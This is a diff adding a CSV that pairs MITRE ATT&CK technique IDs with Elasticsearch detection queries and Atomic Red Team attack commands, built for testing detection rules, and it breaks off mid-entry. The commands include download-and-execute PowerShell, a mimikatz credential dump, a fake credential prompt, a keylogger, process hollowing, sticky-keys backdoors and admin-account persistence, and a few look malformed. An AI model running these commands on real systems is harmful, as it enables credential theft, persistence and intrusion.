@@ -1,0 +1,1330 @@
+﻿T1037.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""match"":{""CommandLine"": ""Environment""}},                                                           
+                            {""match_phrase"":{""CommandLine"": ""REG.exe ADD""}}, 
+                             {""wildcard"":{""CommandLine"": ""*.bat""}},                 
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","echo ""echo Art ""Logon Script"" atomic test was successful. 
+>> %USERPROFILE%\desktop\T1037.001-log.txt"" 
+> %temp%\art.bat && REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d ""%temp%\art.bat"" /f",2,,
+T1040,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+               
+                {""match_phrase"": {""CommandLine"": ""tshark.exe""}},
+                 {""match_phrase"": {""CommandLine"": ""Ethernet""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","""c:\Program Files\Wireshark\tshark.exe"" -i Ethernet -c 5",2,,
+T1040,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                 {""match_phrase"": {""CommandLine"": ""netsh trace start""}}            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}",netsh trace start capture=yes tracefile=%temp%\trace.etl maxsize=10,2,,
+T1053.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+               
+                {""match"": {""CommandLine"": ""at""}},
+                 {""match"": {""CommandLine"": ""interactive""}},
+                 {""match"": {""CommandLine"": ""cmd""}},
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}",at 13:20 /interactive cmd,2,,
+T1053.005,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                        {""match_phrase"": {""CommandLine"": ""Register-ScheduledTask""}},
+                         {""match"": {""CommandLine"": ""Highest""}},
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","$Action = New-ScheduledTaskAction -Execute ""calc.exe""; 
+$Trigger = New-ScheduledTaskTrigger -AtLogon; 
+$User = New-ScheduledTaskPrincipal -GroupId ""BUILTIN\Administrators"" -RunLevel Highest; 
+$Set = New-ScheduledTaskSettingsSet; 
+$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set;
+Register-ScheduledTask AtomicTask -InputObject $object",2,,
+T1053.005,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                 {""match_phrase"": {""CommandLine"": ""reg add""}},
+                  {""match_phrase"": {""CommandLine"": "" schtasks.exe""}},
+                {""wildcard"": {""CommandLine"": ""powershell*""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f 
+&& schtasks.exe /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" 
+powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))"" /sc daily /st 07:45",2,,
+T1053.005,"
+{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                  {""wildcard"":{""CommandLine"": ""schtasks*""}}        
+                ]
+     }
+    },
+    {""bool"":{
+     ""should"":[ 
+                {""match"": {""CommandLine"": ""onlogon""}},
+                {""match"": {""CommandLine"": ""onstart""}}
+                     ]
+     }
+    }
+                 ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","schtasks /create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"" 
+&& schtasks /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""",2,,
+T1053.005,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""wildcard"": {""CommandLine"": ""SCHTASKS*""}},
+                {""match"": {""CommandLine"": ""spawn""}},
+                {""match"": {""CommandLine"": ""/ST""}},
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}",SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10,2,,
+T1053.005,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                                 {""match_phrase"": {""CommandLine"": ""Invoke-MalDoc""}},
+                                 {""match_phrase"": {""CommandLine"": ""-macroFile""}},
+                                 {""match_phrase"": {""CommandLine"": ""Scheduler""}},
+
+
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
+IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) ; 
+Invoke-MalDoc -macroFile ""PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt"" -officeProduct ""Word"" -sub ""Scheduler""",,,
+T1053.005,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                                 {""match_phrase"": {""CommandLine"":""Invoke-CimMethod""}},
+                                 {""match_phrase"": {""CommandLine"":""Microsoft\\Windows\\TaskScheduler""}},
+                                   {""wildcard"": {""CommandLine"":""*.xml""}},
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","$xml = [System.IO.File]::ReadAllText(""PathToAtomicsFolder\T1053.005\src\T1053_005_WMI.xml""); 
+Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace ""Root\Microsoft\Windows\TaskScheduler"" -MethodName ""RegisterByXml"" -Arguments @{ Force = $true; Xml =$xml; }",2,,
+T1055,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                 {""wildcard"": {""CommandLine"": ""PsExec*""}},
+                 {""match"": {""CommandLine"": ""inject""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","C:\PSTools\PsExec.exe /accepteula \\DC1 -c %tmp%\mimikatz\x64\mimikatz.exe ""lsadump::lsa /inject /id:500"" ""exit""",2,,
+T1055,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                 {""match_phrase"": {""CommandLine"": "" Invoke-Maldoc""}},
+                   {""match"": {""CommandLine"": ""Execute""}},
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
+IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing); 
+Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt"" -officeProduct ""Word"" -sub ""Execute""",2,,
+T1055.001,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must_not"":[
+                        {""match_phrase"": {""CommandLine"": ""Invoke-WebRequest""}},
+                 
+                    ]
+     }
+    },
+    {""bool"":{
+     ""must"":[
+                   {""match"": {""CommandLine"": ""INJECTRUNNING""}},
+                {""match"": {""CommandLine"": ""mavinject""}}
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",$mypid =; mavinject $mypid /INJECTRUNNING,与T1056.004混淆,,
+T1055.012,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                 {""match"": {""CommandLine"": ""-Sponsor""}},
+                 {""match"": {""CommandLine"": ""-Hollow""}},
+                  {""match"": {""CommandLine"": ""-ParentPID""}},
+                {""match_phrase"": {""CommandLine"": ""Start-Hollow""}},
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}",". cd6d01_Start-Hollow.ps1;
+$ppid=Get-Process explorer | select -expand id; 
+Start-Hollow -Sponsor ""C:\Windows\System32\notepad.exe"" -Hollow ""C:\Windows\System32\cmd.exe"" -ParentPID $ppid -Verbose",2,,
+T1055.012,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                 {""match_phrase"": {""CommandLine"": ""Invoke-MalDoc""}},
+                  {""match"": {""CommandLine"": ""Exploit""}},          
+                        ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
+IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) ; 
+Invoke-MalDoc -macroFile ""PathToAtomicsFolder\T1055.012\src\T1055.012-macrocode.txt"" -officeProduct ""Word"" -sub ""Exploit""",2,,
+T1056.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                 {""match_phrase"": {""CommandLine"": ""Set-Location""}},
+                {""match"": {""CommandLine"": ""-LogPath""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}",Set-Location $PathToAtomicsFolder; .\T1056.001\src\Get-Keystrokes.ps1 -LogPath $env:TEMP\key.log,,,
+T1056.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                 {""wildcard"": {""CommandLine"": ""*UI.PromptForCredential""}},
+                {""wildcard"": {""CommandLine"": ""*GetNetworkCredential""}},
+                 {""match"": {""CommandLine"": ""Password""}}
+          ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName); write-warning $cred.GetNetworkCredential().Password",2,,
+T1056.004,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match"": {""CommandLine"": ""mavinject""}},
+                 {""match"": {""CommandLine"": ""INJECTRUNNING""}},
+                 {""match_phrase"": {""CommandLine"": ""Invoke-WebRequest""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}",mavinject $pid /INJECTRUNNING; Invoke-WebRequest,2,,
+T1072,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""Radmin.*""}}            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","if not exist ""%PROGRAMFILES(x86)%/Radmin Viewer 3/Radmin.exe""  ( call ) ELSE ( echo Downloading radmin installer && bitsadmin /transfer myDownloadJob /download /priority normal ""r.msi"" /qn ) &&   &&  ""%PROGRAMFILES(x86)%/Radmin Viewer 3/Radmin.exe""",2,,
+T1078.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""wildcard"": {""CommandLine"": ""net*""}}, 
+              {""match"": {""CommandLine"": ""guest""}} ,
+                {""match"": {""CommandLine"": ""user""}} 
+                                ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}",net user guest /active:yes,2,,
+T1078.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                 {""wildcard"": {""CommandLine"": ""net *""}},
+                  {""wildcard"": {""CommandLine"": ""user""}},
+                 {""wildcard"": {""CommandLine"": ""reg *""}},
+                 {""wildcard"": {""CommandLine"": ""add""}},
+                 {""match_phrase"": {""CommandLine"": ""CurrentControlSet\\Control\\Terminal Server""}},
+                {""match"": {""CommandLine"": ""localgroup""}}
+                           ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","net user #{guest_user} /active:yes 
+&& net user #{guest_user} #{guest_password} 
+&& net localgroup #{local_admin_group} #{guest_user} /add 
+&& net localgroup ""#{remote_desktop_users_group_name}"" #{guest_user} /add 
+&& reg add ""hklm\system\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
+&& reg add ""hklm\system\CurrentControlSet\Control\Terminal Server"" /v ""AllowTSConnections"" /t REG_DWORD /d 0x1 /f",,,
+T1078.003,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match"": {""CommandLine"": ""/add""}},
+                          {""wildcard"": {""CommandLine"": ""net*""}}
+                    ]
+     }
+    },
+               {""bool"":{
+     ""must_not"":[
+                        {""match"": {""CommandLine"": ""/domain""}},
+                         {""match"": {""CommandLine"": ""/active""}},
+                    ]
+     }
+    },
+    {""bool"": {
+                    ""should"":[
+                        {""match"": {""CommandLine"": ""user""}},
+                        {""match"": {""CommandLine"": ""administrators""}}
+                    ]
+                }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","net user art-test /add 
+&& net user art-test Password123! 
+&& net localgroup administrators art-test /add",2,,
+T1091,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                 {""match_phrase"": {""CommandLine"": "" Win32_LogicalDisk""}},
+                {""match_phrase"": {""CommandLine"": ""drivetype=2""}},
+                 {""match_phrase"": {""CommandLine"": ""DeviceID""}}        
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","$RemovableDrives=@(); $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter ""drivetype=2"" | select-object -expandproperty DeviceID; 
+ForEach ($Drive in $RemovableDrives); 
+{; write-host ""Removable Drive Found:"" $Drive; 
+New-Item -Path $Drive/T1091Test1.txt -ItemType ""file"" -Force -Value ""T1091 Test 1 has created this file to simulate malware spread to removable drives.""; }",2,,
+T1133,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                
+                {""match_phrase"": {""CommandLine"": ""Start chrome""}}, 
+            {""match_phrase"": {""CommandLine"": ""Stop-Process""}}
+           ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","$extList = ""fcfhplploccackoneaefokcmbjfbkenj"", ""fdcgdnkidjaadafnichfpabhfomcebme""; 
+foreach ($extension in $extList) {;   New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force;  
+New-ItemProperty -Path ""HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension"" -Name ""update_url"" -Value ""https://clients2.google.com/service/update2/crx"" -PropertyType ""String"" -Force}; 
+Start chrome; Start-Sleep -Seconds 30; Stop-Process -Name ""chrome""",2,,
+T1134.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                 {""match"": {""CommandLine"": ""-Technique""}},
+                  {""match"": {""CommandLine"": ""NamedPipe""}},
+                  {""match"": {""CommandLine"": ""-Verbose""}},
+                 {""match_phrase"": {""CommandLine"": ""Get-System""}}        
+                        ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+ IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); 
+Get-System -Technique NamedPipe -Verbose",2,,
+T1134.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                 {""match_phrase"": {""CommandLine"": ""Set-ExecutionPolicy""}},
+                  {""match_phrase"": {""CommandLine"": ""Get-Process""}},
+                   {""match_phrase"": {""CommandLine"": ""Select ProcessName""}},
+                {""match_phrase"": {""CommandLine"": ""CreateProcessFromParent""}}            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","Set-ExecutionPolicy -Scope Process Bypass -Force; 
+$owners = @{}; gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}; 
+Get-Process | Select ProcessName,Id,@{l=""Owner"";e={$owners[$_.id.tostring()]}}; 
+$PathToAtomicsFolder\T1134.002\src\GetToken.ps1; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,""cmd.exe"")",2,,
+T1134.004,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                        {""match_phrase"": {""CommandLine"": ""Start-ATHProcessUnderSpecificParent""}},
+                         {""match_phrase"": {""CommandLine"": ""System32\\WindowsPowerShell\\v1.0\\powershell.exe""}},
+                        {""match"": {""CommandLine"": ""AtomicTestHarnesses""}},
+                       {""match"": {""CommandLine"": ""-ParentId""}}
+           ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; 
+if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  
+Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\System32\WindowsPowerShell\v1.0\powershell.exe -CommandLine '-Command Start-Sleep 10' -ParentId $PID",2,,
+T1134.004,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                             {""match_phrase"": {""CommandLine"": ""Start-ATHProcessUnderSpecificParent""}},
+                             {""match"": {""CommandLine"": "" AtomicTestHarnesses""}},
+                              {""match"": {""CommandLine"": ""-TestGuid""}},
+                             {""match"": {""CommandLine"": ""-ParentId""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}",$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Start-ATHProcessUnderSpecificParent  -ParentId $PID -TestGuid 12345678-1234-1234-1234-123456789123,2,,
+T1134.004,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""Program Files\\Internet Explorer\\iexplore.exe""}},           
+                {""wildcard"": {""CommandLine"": ""*ps1""}},
+                  {""wildcard"": {""CommandLine"": ""*dll""}} 
+
+
+           ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}",". 124a70_PPID-Spoof.ps1; $ppid=Get-Process explorer | select -expand id; 
+PPID-Spoof -ppid $ppid -spawnto ""C:\Program Files\Internet Explorer\iexplore.exe"" -dllpath ""8b38ee_calc.dll""",2,,
+T1197,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match"": {""CommandLine"": ""set""}},    
+                 {""wildcard"": {""CommandLine"": ""desktopimgdownldr*""}},
+                {""match"": {""CommandLine"": ""cmd""}} 
+        ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","set ""SYSTEMROOT=C:\Windows\Temp"" && cmd /c desktopimgdownldr.exe
+/lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr",2,,
+T1497.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""wildcard"": {""CommandLine"": ""*.clear""}},
+                {""match_phrase"": {""CommandLine"": ""Get-WmiObject""}},
+                {""match"": {""CommandLine"": ""SELECT""}}  
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","$error.clear(); 
+Get-WmiObject -Query ""SELECT * FROM MSAcpi_ThermalZoneTemperature"" -ErrorAction SilentlyContinue; 
+if($error) {echo ""Virtualization Environment detected""}",2,,
+T1497.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""wildcard"": {""CommandLine"": ""*ToLower""}},
+                         {""wildcard"": {""CommandLine"": ""*contains""}},
+                         {""match"": {""CommandLine"": ""Manufacturer""}}
+                    ]
+     }
+    },
+    {""bool"": {
+                    ""should"":[
+                        {""match"": {""CommandLine"": ""virtual""}},
+                        {""match"": {""CommandLine"": ""vmware""}},
+                        {""match"": {""CommandLine"": ""virtualbox""}},
+                    ]
+                }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty ""Manufacturer""; 
+$Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty ""Model""; 
+if((($Manufacturer.ToLower() -eq ""microsoft corporation"") -and ($Model.ToLower().contains(""virtual""))) -or ($Manufacturer.ToLower().contains(""vmware"")) -or ($Model.ToLower() -eq ""virtualbox"")) {write-host ""Virtualization environment detected!""} else {write-host ""No virtualization environment detected!""}",2,,
+T1543.003,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": "" sc config""}},
+                {""match_phrase"": {""CommandLine"": ""sc start""}}, 
+                 {""match"": {""CommandLine"": ""-noexit""}},
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","sc config Fax binPath= ""C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe 
+-noexit -c \""write-host 'T1543.003 Test'\"""" && sc start Fax",2,,
+T1543.003,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must_not"":[
+                        {""match"": {""CommandLine"": ""delete""}},
+                 
+                    ]
+     }
+    },
+    {""bool"":{
+     ""must"":[
+                      
+                    {""match_phrase"": {""CommandLine"": ""sc.exe create""}},
+                {""match_phrase"": {""CommandLine"": ""sc.exe start""}} 
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",sc.exe create AtomicTestService_CMD binPath= 411da5_AtomicService.exe && sc.exe start AtomicTestService_CMD,2,,
+T1543.003,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""New-Service""}},
+                {""match_phrase"": {""CommandLine"": ""Start-Service""}}, 
+                 {""match"": {""CommandLine"": ""-BinaryPathName""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","New-Service -Name ""AtomicTestService_PowerShell"" -BinaryPathName ""411da5_AtomicService.exe""; Start-Service -Name ""AtomicTestService_PowerShell""",3,,
+T1543.003,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""copy""}},
+                {""wildcard"": {""CommandLine"": ""*dll""}},
+                {""match_phrase"": {""CommandLine"": ""sc create""}},
+                 {""match_phrase"": {""CommandLine"": ""sc config""}},
+                  {""match_phrase"": {""CommandLine"": ""Microsoft\\Windows NT\\CurrentVersion\\Svchost""}},
+                  {""match_phrase"": {""CommandLine"": ""CurrentControlSet\\Services\\W64Time\\Parameters""}},
+                {""match_phrase"": {""CommandLine"": ""reg add""}},
+                 {""match_phrase"": {""CommandLine"": ""sc start""}}  
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","copy $PathToAtomicsFolder\T1543.003\bin\w64time.dll %systemroot%\system32\ && sc create W64Time binPath= ""c:\Windows\System32\svchost.exe -k TimeService"" type= share start=auto 
+&& sc config W64Time DisplayName= ""Windows 64 Time"" && sc description W64Time ""Maintain date and time synch on all clients and services in the network"" 
+&& reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost"" /v TimeService /t REG_MULTI_SZ /d ""W64Time"" /f 
+&& reg add ""HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters"" /v ServiceDll /t REG_EXPAND_SZ /d ""%systemroot%\system32\w64time.dll"" /f && sc start W64Time",,,
+T1546.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""assoc""}}            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}",assoc .hta=txtfile,2,,
+T1546.002,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                  {""match_phrase"":{""CommandLine"": ""Control Panel\\Desktop""}},  
+                   {""wildcard"":{""CommandLine"": ""reg*""}},
+                   {""match"":{""CommandLine"": ""add""}}      
+                ]
+     }
+    },
+    {""bool"":{
+     ""should"":[ 
+                {""match_phrase"": {""CommandLine"": ""ScreenSaveActive""}},
+                {""match_phrase"": {""CommandLine"": ""ScreenSaveTimeout""}},
+                {""match_phrase"": {""CommandLine"": ""ScreenSaverIsSecure""}},
+                {""match_phrase"": {""CommandLine"": ""SCRNSAVE.EXE""}}
+                     ]
+     }
+    }
+                 ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","copy C:\Windows\System32\cmd.exe ""%SystemRoot%\System32\evilscreensaver.scr""
+ && reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f 
+&& reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f 
+&& reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f 
+&& reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f 
+&& shutdown /r /t 0",2,,
+T1546.003,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""TargetInstance.SystemUpTime""}},
+                {""match_phrase"": {""CommandLine"": ""notepad.exe""}},
+                {""match_phrase"": {""CommandLine"": "" New-CimInstance""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example';                 
+EventNameSpace='root\CimV2';                 
+QueryLanguage=""WQL"";                
+ Query=""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325""}; 
+$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs; 
+$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example';                 
+CommandLineTemplate=""$($Env:SystemRoot)\System32\notepad.exe"";}; $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs; 
+$FilterToConsumerArgs = @{; Filter = [Ref] $Filter; Consumer = [Ref] $Consumer; }; 
+$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs",2,,
+T1546.007,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match"": {""CommandLine"": ""add""}},
+                 {""wildcard"": {""CommandLine"": ""*dll""}},
+                {""wildcard"": {""CommandLine"": ""netsh*""}} 
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}",c helper C:\Path\file.dll,,,
+T1546.008,"
+{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                  {""match_phrase"":{""CommandLine"": ""Microsoft\\Windows NT\\CurrentVersion\\Image""}},  
+                   {""wildcard"":{""CommandLine"": ""*trim""}},      
+                ]
+     }
+    },
+    {""bool"":{
+     ""should"":[ 
+                {""match_phrase"": {""CommandLine"": ""osk.exe""}},
+                {""match_phrase"": {""CommandLine"": ""sethc.exe""}},
+                {""match_phrase"": {""CommandLine"": ""utilman.exe""}},
+                {""match_phrase"": {""CommandLine"": ""magnify.exe""}},
+                 {""match_phrase"": {""CommandLine"": ""narrator.exe""}},
+                 {""match_phrase"": {""CommandLine"": "" DisplaySwitch.exe""}},
+                {""match_phrase"": {""CommandLine"": "" atbroker.exe""}}
+                     ]
+     }
+    }
+                 ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","$input_table = ""osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe"".split("",""); $Name = ""Debugger""; 
+$Value = ""C:\windows\system32\cmd.exe""; 
+Foreach ($item in $input_table){;   $item = $item.trim();   
+$registryPath = ""HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item"";   
+IF(!(Test-Path $registryPath));   {;     New-Item -Path $registryPath -Force;     New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force;   };   
+ELSE;   {;     New-ItemProperty -Path $registryPath -Name $name -Value $Value;   }; }",2,,
+T1546.008,"   {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""copy""}},
+                {""match"": {""CommandLine"": ""icacls""}},
+                {""match"": {""CommandLine"": ""takeown""}}            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe 
+&& takeown /F C:\Windows\System32\sethc.exe /A && icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t 
+&& copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe",2,,
+T1546.010,"            {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""wildcard"": {""CommandLine"": ""reg*""}},
+                 {""match"": {""CommandLine"": ""import""}},
+           ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}",reg.exe import e764f6_T1546.010.reg,,,
+T1546.011,"                         {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""wildcard"": {""CommandLine"": ""sdbinst*""}},
+                {""wildcard"": {""CommandLine"": ""*sdb""}}            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}",sdbinst.exe 729b9b_AtomicShimx86.sdb,,,
+T1546.011,"                                  {
+    ""query"": {
